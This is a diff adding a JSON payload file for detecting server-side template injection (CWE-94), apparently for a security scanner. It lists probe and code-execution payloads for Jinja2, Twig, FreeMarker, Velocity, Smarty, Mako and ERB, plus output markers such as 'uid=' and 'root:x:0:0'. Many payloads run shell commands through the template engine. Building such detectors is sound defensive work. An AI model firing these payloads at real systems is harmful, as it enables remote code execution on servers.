@@ -1,0 +1,17 @@
+{
+  "variants": {
+    "jinja2": ["{{7*7}}", "{{7*'7'}}", "{{config}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{cycler.__init__.__globals__.os.popen('id').read()}}", "{{joiner.__init__.__globals__.os.popen('id').read()}}", "{{namespace.__init__.__globals__.os.popen('id').read()}}", "{{lipsum.__globals__['os'].popen('id').read()}}"],
+    "twig": ["{{7*'7'}}", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "{{['id']|filter('system')}}", "{{app.request.server.all|join(',')}}"],
+    "freemarker": ["${7*7}", "#{7*7}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "${object.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}"],
+    "velocity": ["#set($x=$class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\"))", "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")", "#set($cmd='id')#set($os=$class.inspect('java.lang.Runtime').type.getRuntime().exec($cmd))"],
+    "smarty": ["{7*7}", "{system('id')}", "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,$SCRIPT_NAME,'id')}", "{if system('id')}{/if}"],
+    "mako": ["${7*7}", "<%import os%>${os.popen('id').read()}", "${self.module.cache.util.os.popen('id').read()}"],
+    "erb": ["<%= 7*7 %>", "<%= `id` %>", "<%= system('id') %>", "<%= IO.popen('id').read() %>"]
+  },
+  "payloads": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}", "{{config}}", "{{request}}"],
+  "markers": ["49", "7777777", "com.sun.proxy", "root:x:0:0", "uid=", "gid=", "groups=", "freemarker", "jinja2", "org.apache.velocity", "smarty", "mako"],
+  "metadata": {
+    "cwe": "CWE-94",
+    "technique": "Server-Side Template Injection"
+  }
+}
